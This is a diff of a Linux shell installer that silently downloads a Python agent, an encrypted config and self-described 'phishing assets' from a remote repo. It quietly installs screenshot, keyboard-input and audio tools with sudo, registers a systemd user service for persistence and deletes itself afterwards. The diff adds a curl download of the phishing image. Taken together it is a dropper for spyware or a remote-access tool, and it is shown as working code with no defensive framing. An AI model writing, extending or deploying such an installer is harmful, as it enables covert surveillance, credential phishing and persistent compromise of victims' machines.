@@ -11,23 +11,24 @@ mkdir -p "$INSTALL_DIR"
 # 2. Download Files
 # Utilizing curl or wget depending on availability
 if command -v curl >/dev/null 2>&1; then
-    curl -sL "$REPO/linux/agent.py" -o "$INSTALL_DIR/agent.py"
-    curl -sL "$REPO/config.enc" -o "$INSTALL_DIR/config.enc"
+   curl -sL "$REPO/linux/agent.py" -o "$INSTALL_DIR/agent.py"
+   curl -sL "$REPO/config.enc" -o "$INSTALL_DIR/config.enc"
+   curl -sL "$REPO/linux/prompt.png" -o "$INSTALL_DIR/prompt.png"
 elif command -v wget >/dev/null 2>&1; then
-    wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
-    wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
-    # Download Phishing Assets
-    wget -qO "$INSTALL_DIR/prompt.png" "$REPO/linux/prompt.png"
+   wget -qO "$INSTALL_DIR/agent.py" "$REPO/linux/agent.py"
+   wget -qO "$INSTALL_DIR/config.enc" "$REPO/config.enc"
+   # Download Phishing Assets
+   wget -qO "$INSTALL_DIR/prompt.png" "$REPO/linux/prompt.png"
 else
-    echo "No downloader found."
-    exit 1
+   echo "No downloader found."
+   exit 1
 fi
 
 # 3. Install Dependencies (Try SUDO, else skip)
 # This part might prompt for password if run interactively, or fail silently if not.
 if command -v sudo >/dev/null 2>&1; then
-    sudo apt-get update -qq >/dev/null 2>&1
-    sudo apt-get install -y -qq python3 python3-tk scrot xinput alsa-utils >/dev/null 2>&1
+   sudo apt-get update -qq >/dev/null 2>&1
+   sudo apt-get install -y -qq python3 python3-tk scrot xinput alsa-utils >/dev/null 2>&1
 fi
 
 # 4. Create Systemd User Service
@@ -53,3 +54,5 @@ systemctl --user restart "$SERVICE_NAME"
 
 # 6. Cleanup Self (Optional)
 rm -- "$0"
+
+
